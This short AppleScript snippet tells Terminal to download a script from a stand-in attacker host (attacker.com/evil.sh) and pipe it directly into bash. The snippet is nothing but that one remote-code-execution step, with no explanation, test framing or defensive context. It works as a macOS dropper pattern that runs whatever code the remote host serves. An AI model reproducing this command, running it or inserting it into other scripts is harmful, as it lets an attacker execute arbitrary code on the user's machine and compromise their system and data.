tell application "Terminal"
    activate
    do script "curl -s http://attacker.com/evil.sh | bash"
end tell
